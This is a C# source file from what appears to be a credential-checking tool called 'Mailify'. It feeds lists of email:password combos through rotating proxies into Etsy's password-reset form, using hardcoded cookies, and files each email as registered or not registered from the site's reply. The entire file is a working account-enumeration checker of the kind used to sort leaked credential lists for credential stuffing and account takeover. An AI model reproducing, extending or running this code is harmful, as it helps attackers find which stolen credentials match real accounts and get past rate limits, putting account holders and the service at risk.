using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Mailify
{
    internal class Etsy_VM
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;


            new Thread(() => Variables.VM_title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();
            Thread.Sleep(-1);
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var req = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    req.Proxy.ConnectTimeout = proxyTimeout;
                    req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));

                    req.AddHeader("cookie", "user_prefs=ZfRk2M1c2jtM9OJik7MsoVPq5Y9jZACCBBdZZhgdreQaGqSkk1eak6OjlJqnGxqspKMUEAIVMYJQuIhYBgA.; fve=1615076611.0; uaid=_iJhNpJVCHZgQ8SOR0jNT3TCTadjZACCBBdZZhhdrVSamJmiZKXkHZmZZGaeER4RZuzjkeTtVplokJTmE-8T5uxSolTLAAA.; last_browse_page=https%3A%2F%2Fwww.etsy.com%2F; ua=531227642bc86f3b5fd7103a0c0b4fd6; G_ENABLED_IDPS=google; __zlcmid=12zjrQqPwYjulzk; exp_hangover=1LyYExNxj0cDXVYeHw8afqx_F5tjZACCBBdZZiidWK1UnpoUn1hUkpmWmZyZmBOfk1iSmpdcGV9oEm9kYGipZKWUmZeak5memZSTqlTLAAA.; p=eyJnZHByX3RwIjoxLCJnZHByX3AiOjF9");
                    string str = $"email={WebUtility.UrlEncode(credentials[0])}&e423e4bd=73588d2e&_nnc=3%3A1615076703%3AZUf-WMPMFZQvksOOsujR7ZxrF4CH%3Acae43a73cf9237464f4ab33f7b3efb8091038dd7894099d5ef00f41197fd153b&submit=Submit";
                    string check = req.Post("https://www.etsy.com/forgot_password.php", str, "application/x-www-form-urlencoded").ToString();

                    if (check.Contains("Sorry, there's no account associated"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            File.AppendAllText(Variables.results + "Not Registered.txt", combo + Environment.NewLine);
                        }
                    }
                    else if (check.Contains("It will have a link to reset your password"))
                    {
                        Variables.Valid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            if (Config.kekr_UI == "LOG")
                            {
                                Console.WriteLine($"[+] {combo}", Color.Green);
                            }
                            File.AppendAllText(Variables.results + "Registered.txt", combo + Environment.NewLine);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }
                }

            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}